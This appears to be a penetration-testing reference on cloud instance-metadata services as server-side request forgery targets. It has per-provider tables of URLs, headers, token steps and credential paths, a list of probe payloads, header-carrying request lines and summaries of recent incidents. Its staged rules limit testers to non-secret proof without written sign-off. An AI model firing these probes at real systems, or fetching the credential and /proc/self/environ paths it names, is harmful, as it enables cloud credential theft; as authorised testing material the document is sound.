# Instance metadata endpoints as SSRF targets

A lookup table: which URL, which header, which token, and which **non-secret**
leaf proves you reached it. Everything assumes you already hold an SSRF (or a
file read) on an in-scope host from an external foothold. How to find and widen
the SSRF (redirects, DNS rebinding, header control, the IMDSv2 bypass
conditions, Typebot CVE-2025-64709) is owned by `hunt-ssrf`. What a
retrieved credential grants is owned by `cloud-iam-deep`. Kubernetes API, kubelet
and service-account tokens are owned by `hunt-k8s`.

Facts marked "(verify)" could not be confirmed against a primary source on
2026-10-13.

## Stage A stop point

Same rule as `hunt-ssrf`: **prove reach with a non-secret leaf, or the role
name, then stop.** A credential path is named in the table so you can describe
impact, not so you can fetch it. Pulling keys or tokens, and using them, is
Stage B (end of this file).

A GET-only SSRF with no header control reaches only the "no header" rows. An
error status from the link-local address that differs from every other target
(`400`/`401`/`403` where external URLs give `200`) already proves reach, because
the metadata service answered.

## Fingerprint the cloud from one reachable IP

When `169.254.169.254` answers and you do not know the provider, try these
leaves one at a time. Each is non-secret.

| Leaf | Answers on |
|---|---|
| `/latest/meta-data/instance-id` | AWS IMDSv1 (OpenStack serves an EC2-compatible tree too) |
| `/metadata/v1/id` | DigitalOcean |
| `/hetzner/v1/metadata` | Hetzner Cloud |
| `/opc/v1/instance/region` | OCI with v1 still enabled (404 when v1 is disabled) |
| `/v1.json` | Vultr |
| `/openstack/latest/meta_data.json` | OpenStack |
| `/metadata/instance?api-version=2021-02-01` | Azure (rejected without `Metadata: true`) |
| `/computeMetadata/v1/project/project-id` | GCP (rejected without `Metadata-Flavor: Google`) |
| `/v1/instance` | Akamai/Linode (needs `Metadata-Token`) |

Other addresses: `100.100.100.200` (Alibaba), `169.254.42.42` (Scaleway),
`169.254.170.2` (ECS), `169.254.170.23` (EKS Pod Identity).

## Endpoint table

| Platform | Base URL | Header / token | Non-secret proof | Secret paths (name, do not fetch) |
|---|---|---|---|---|
| AWS EC2 IMDSv1 | `http://169.254.169.254/latest/`, IPv6 `http://[fd00:ec2::254]/latest/` | none | `meta-data/instance-id`, `meta-data/placement/region` | `meta-data/iam/security-credentials/<role>`, `user-data` |
| AWS EC2 IMDSv2 | same | `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then `X-aws-ec2-metadata-token: <tok>` | same | same |
| ECS task metadata v4 (EC2 and Fargate) | `${ECS_CONTAINER_METADATA_URI_V4}`, which is `http://169.254.170.2/v4/<id>` | none, but `<id>` is per container | `${...}/task` | (none; task and container metadata, network, tags) |
| ECS / Fargate task role | `http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}` | none, but the path is a random GUID | (none) | the URI itself returns the role keys |
| EKS Pod Identity | `http://169.254.170.23/v1/credentials` (`AWS_CONTAINER_CREDENTIALS_FULL_URI`) | `Authorization: <contents of AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE>` | (none) | `/v1/credentials` |
| AWS Lambda | no metadata service; keys are env vars | n/a | (none) | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` via file read of `/proc/self/environ` |
| Azure VM / VMSS | `http://169.254.169.254/metadata/` | `Metadata: true`; request **must not** carry `X-Forwarded-For` | `instance/compute/location?api-version=2021-02-01&format=text` | `identity/oauth2/token?api-version=2018-02-01&resource=...` |
| Azure App Service / Functions | `$IDENTITY_ENDPOINT` (local URL) | `X-IDENTITY-HEADER: $IDENTITY_HEADER` (value rotated by platform, exists to stop SSRF) | (none) | `?resource=...&api-version=2019-08-01` |
| GCP (GCE, GKE nodes, Cloud Run, Cloud Functions) | `http://metadata.google.internal/computeMetadata/v1/`, `http://169.254.169.254/computeMetadata/v1/`, `http://metadata.goog/computeMetadata/v1/`, IPv6-only `http://[fd20:ce::254]/computeMetadata/v1/` | `Metadata-Flavor: Google`; any `X-Forwarded-For` is rejected | `project/project-id` | `instance/service-accounts/default/token`, `.../identity?audience=...`, `instance/attributes/` (startup scripts, `kube-env` on legacy GKE) |
| DigitalOcean | `http://169.254.169.254/metadata/v1/`, `/metadata/v1.json` | none | `/metadata/v1/id`, `/metadata/v1/region` | `/metadata/v1/user-data` (no IAM credential service) |
| Hetzner Cloud | `http://169.254.169.254/hetzner/v1/`, IPv6 link-local `fe80::a9fe:a9fe%<nic>` | none | `metadata` (instance data) | `userdata` |
| OCI v1 | `http://169.254.169.254/opc/v1/`, also `/openstack` | none | `instance/region` | `instance/metadata/user_data` |
| OCI v2 | `http://169.254.169.254/opc/v2/`, IPv6 `http://[fd00:c1::a9fe:a9fe]/opc/v2/` | `Authorization: Bearer Oracle` | `instance/region`, `instance/canonicalRegionName` | `instance/metadata/user_data`; instance-principal identity paths under `/opc/v2/identity/` (verify) |
| Alibaba ECS | `http://100.100.100.200/latest/meta-data/` | normal mode none; hardened mode `PUT /latest/api/token` with `X-aliyun-ecs-metadata-token-ttl-seconds` (1-21600), then `X-aliyun-ecs-metadata-token` | `instance-id`, `region-id` | `ram/security-credentials/<role>`, `/latest/user-data` |
| Vultr | `http://169.254.169.254/v1.json`, `/v1/` | none documented; cloud-init sends `Metadata-Token: cloudinit` (verify whether required) | `v1.json` (instance id, region) | `user-data` field inside `v1.json` |
| Akamai / Linode | `http://169.254.169.254/v1/`, IPv6 `http://[fd00:a9fe:a9fe::1]/v1/` | `PUT /v1/token` with `Metadata-Token-Expiry-Seconds: 3600`, then `Metadata-Token: <tok>` | `/v1/instance`, `/v1/network` | `/v1/user-data` (base64) |
| Scaleway | `http://169.254.42.42/`, IPv6 `http://[fd00:42::42]/` | none for `/conf`; `/user_data` only answers a **source port below 1024** (root) | `conf?format=json` | `user_data/cloud-init`, `vendor_data/cloud-init` |
| OpenStack | `http://169.254.169.254/openstack/latest/`, IPv6 `fe80::a9fe:a9fe%<nic>` | none | `meta_data.json` | `user_data`, `vendor_data.json`, `vendor_data2.json`, `network_data.json`; EC2-compatible `/latest/meta-data/` |
| Equinix Metal | `https://metadata.platformequinix.com/metadata` (formerly `metadata.packet.net`) (verify) | none | n/a | n/a. **Service shut down 2026-06-30**; resources removed 2026-07-01. Historical only |
| Kubernetes in-cluster | `https://kubernetes.default.svc`; token file `/var/run/secrets/kubernetes.io/serviceaccount/token` | Bearer token from the file | owned by `hunt-k8s` | owned by `hunt-k8s` |

### Notes that change what an SSRF can reach

- **AWS.** IMDSv2's token reply has a default IP TTL of 1, and a `PUT` carrying
  `X-Forwarded-For` gets no token (details and exceptions in `hunt-ssrf`).
  "Effective mid-2024, newly released EC2 instance types" support only IMDSv2
  (AWS News Blog), and since March 2024 an account can make IMDSv2-only the
  default for new launches (`aws ec2 modify-instance-metadata-defaults`).
  Amazon Linux 2023 AMIs default to IMDSv2-only. Existing instances keep their setting.
- **ECS and EKS paths are not guessable.** `ECS_CONTAINER_METADATA_URI_V4` carries
  a per-container ID and `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` a GUID, and EKS
  Pod Identity wants a token read from a file. A blind SSRF gets none of them
  without an environment or file disclosure first (`/proc/self/environ`, a
  debug page, a stack trace). Fargate tasks have no EC2 IMDS at all.
- **ECS on EC2 shares the node.** A task that can reach the EC2 IMDS on an
  EC2-launch-type cluster reaches the *instance* role, and (ECScape, below) could
  impersonate the ECS agent. Report the hop-limit / `awsvpc` configuration with it.
- **Azure App Service.** `X-IDENTITY-HEADER` exists to stop SSRF. Without an env
  leak, a plain SSRF reaches nothing here. Whether the VM-style IMDS at
  `169.254.169.254` answers from App Service workers is (verify); do not assume it does.
- **GCP.** Cloud Run and Cloud Functions use the same metadata server and
  header. The legacy `X-Google-Metadata-Request` header is deprecated. Whether the
  old `v0.1`/`v1beta1` header-less paths still answer anywhere is (verify).
  Assume they do not.
- **Alibaba.** The docs state ECS instances allow token-free (normal mode)
  access **by default**. A GET-only SSRF therefore often works there.
- **Scaleway.** The privileged-source-port rule means an SSRF from a non-root
  web process reads `/conf`, but not user data.
- **Lambda.** Never request `$AWS_LAMBDA_RUNTIME_API/2018-06-01/runtime/invocation/next`
  from an SSRF. That call *consumes* the next invocation's event, which is a
  production side effect, not a read.

## Stage A probes (values for the vulnerable parameter)

Send one at a time, record status + body length + first bytes.

```text
http://169.254.169.254/latest/meta-data/instance-id                 # AWS v1: i-0...
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS v1: role NAME only (hunt-ssrf stop point)
http://169.254.169.254/metadata/v1/region                           # DigitalOcean
http://169.254.169.254/hetzner/v1/metadata                          # Hetzner (instance YAML; skim, don't keep userdata)
http://169.254.169.254/opc/v1/instance/region                       # OCI v1
http://169.254.169.254/openstack/latest/meta_data.json              # OpenStack
http://169.254.169.254/v1.json                                      # Vultr (contains user-data: capture keys only, redact values)
http://100.100.100.200/latest/meta-data/region-id                   # Alibaba normal mode
http://169.254.42.42/conf?format=json                               # Scaleway
```

When the SSRF lets you set headers (webhook builders, "custom request" features,
headless browsers, PDF renderers that honour `fetch()` options):

```bash
# Headers the fetcher must send for you. Prove reach with the non-secret leaf only.
-H 'Metadata-Flavor: Google'       http://metadata.google.internal/computeMetadata/v1/project/project-id
-H 'Metadata: true'                'http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text'
-H 'Authorization: Bearer Oracle'  http://169.254.169.254/opc/v2/instance/region
# Token-first services: the PUT creates a short-lived session token, it writes nothing.
# Request the token, then one non-secret leaf, then stop.
PUT http://169.254.169.254/latest/api/token          X-aws-ec2-metadata-token-ttl-seconds: 60
PUT http://100.100.100.200/latest/api/token          X-aliyun-ecs-metadata-token-ttl-seconds: 60
PUT http://169.254.169.254/v1/token                  Metadata-Token-Expiry-Seconds: 60
```

## Grading

| Proven | Severity | Hand-off |
|---|---|---|
| Non-secret leaf returned through SSRF | Medium to High (reach to an internal-only service) | `hunt-ssrf` for scoring |
| AWS role name, GCP SA email, OCI instance OCID visible | High (credential one request away) | `cloud-iam-deep` once Stage B is signed off |
| User data or startup script visible in the non-secret pass | High when it contains secrets; redact before evidence | `evidence-hygiene` |
| Header-required service, header not controllable, only an error code | Low to Medium (reach proven, data not) | document the header requirement as the mitigation in place |

## Incidents and research, 2023-2026

- **CVE-2024-38109, Azure Health Bot** (Tenable, 2024-08-13). A Data Connection to a
  researcher-controlled host answered `301` to `169.254.169.254`; the redirect
  bypassed the IMDS filter and yielded a `management.azure.com` token that listed
  other customers' resources. <https://www.tenable.com/blog/compromising-microsofts-ai-healthcare-chatbot-service>,
  <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38109>
- **CVE-2025-51591, Pandoc iframe SSRF** (published 2025-07-11). Wiz observed
  in-the-wild attempts from August 2025 that used HTML with iframes pointing at
  `169.254.169.254/latest/meta-data/iam/...`. They failed because the targets
  enforced IMDSv2. The Pandoc maintainers call iframe fetching intended and
  recommend `--sandbox`. <https://thehackernews.com/2025/09/hackers-exploit-pandoc-cve-2025-51591.html>
- **ECScape** (Sweet Security, 2025-08-06). Code execution in a low-privilege
  container on the ECS **EC2** launch type, plus IMDS access, let it impersonate
  the ECS agent and collect other tasks' IAM credentials on the same host.
  Fargate is not affected. <https://www.sweet.security/blog/ecscape-understanding-iam-privilege-boundaries-in-amazon-ecs>
- **CVE-2025-64709, Typebot** header-injection IMDSv2 bypass: see `hunt-ssrf`.
- **AWS IMDSv2 by default** for new instance types from mid-2024, and the
  account-level default from March 2024: <https://aws.amazon.com/blogs/aws/amazon-ec2-instance-metadata-service-imdsv2-by-default/>.

## Stage B boundary

```text
Stage B: written sign-off required before any of these, one request each,
named in the sign-off with host, parameter and window:
  - fetching a credential or token path from the table above
  - fetching user data / startup scripts in full (they routinely hold secrets)
  - using any retrieved credential, even for a whoami (then cloud-iam-deep)
Never, signed or not:
  - Lambda runtime API invocation/next or /response (consumes or forges a real invocation)
  - writing instance metadata or attributes (GCP setMetadata, Azure tags) from a stolen token
```

If the program allows credential retrieval, take the shortest proof: AWS
`sts get-caller-identity` or GCP `tokeninfo` for the token you pulled, then
redact the secret halves in the report (`evidence-hygiene`), and tell the
client to rotate.

Sources (checked 2026-10-13): Oracle IMDS
<https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm>,
Alibaba ECS metadata <https://www.alibabacloud.com/help/en/ecs/user-guide/view-instance-metadata>,
Akamai metadata API <https://techdocs.akamai.com/cloud-computing/docs/access-the-metadata-service-api>,
GCP metadata <https://docs.cloud.google.com/compute/docs/metadata/querying-metadata>,
Azure IMDS <https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service>,
App Service managed identity <https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity>,
ECS task metadata v4 <https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v4.html>,
EKS Pod Identity <https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html>,
DigitalOcean metadata <https://docs.digitalocean.com/products/droplets/how-to/access-metadata/>,
cloud-init datasources (Hetzner, Vultr, Scaleway, OpenStack, Oracle, Akamai, AliYun, EC2)
<https://github.com/canonical/cloud-init/tree/main/cloudinit/sources>,
Equinix Metal end of service <https://docs.equinix.com/metal/eos-faq>.
